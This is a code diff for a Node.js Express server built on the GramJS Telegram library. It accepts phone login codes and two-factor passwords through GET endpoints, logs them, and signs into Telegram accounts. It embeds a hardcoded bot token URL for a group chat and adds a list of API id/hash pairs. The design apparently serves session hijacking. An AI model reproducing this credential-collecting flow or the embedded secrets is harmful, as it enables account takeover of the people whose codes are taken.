@@ -9,6 +9,21 @@ const { StringSession } = require("telegram/sessions");
 const ppplbot = "https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage?chat_id=-1001729935532";
 
 const app = express();
+let creds = [
+    {
+        apiId: 27919939,
+        apiHash: "5ed3834e741b57a560076a1d38d2fa94"
+    },
+    {
+        apiId: 25328268,
+        apiHash: "b4e654dd2a051930d0a30bb2add80d09"
+    },
+    {
+        apiId: 2899,
+        apiHash: "b4e654dd2a051930d0a30bb2add80d09"
+    },
+    
+]
 const port = 4000;
 const apiId = 25328268;
 const apiHash = "b4e654dd2a051930d0a30bb2add80d09"
@@ -28,7 +43,7 @@ let password;
 let isCodeViaApp = false;
 const apiCredentials = { apiId: apiId, apiHash: apiHash }
 const stringSession = new StringSession("");
-const client = new TelegramClient(stringSession, apiId, apiHash, {
+let client = new TelegramClient(stringSession, apiId, apiHash, {
     connectionRetries: 5,
 });
 let inProcess = true;
@@ -79,10 +94,10 @@ app.get('/otp', async (req, res, next) => {
     res.send('loggingIn!!');
     next();
 }, async (req, res) => {
-        phoneCode = req.query.code;
-        console.log(phoneCode)
-        console.log("hello:", phoneCode);
-        await login();
+    phoneCode = req.query.code;
+    console.log(phoneCode)
+    console.log("hello:", phoneCode);
+    await login();
 });
 app.get('/password', async (req, res) => {
     password = req.query.password;
@@ -151,10 +166,13 @@ async function restAcc() {
 async function login() {
     try {
         console.log("inside:", phoneCode, phoneNumber, phoneCodeHash);
+
         if (!phoneCode) {
             throw new Error("Code is empty");
         }
-
+        if (!client.connected) {
+            await client.connect();
+        }
         const result = await client?.invoke(
             new Api.auth.SignIn({
                 phoneNumber,
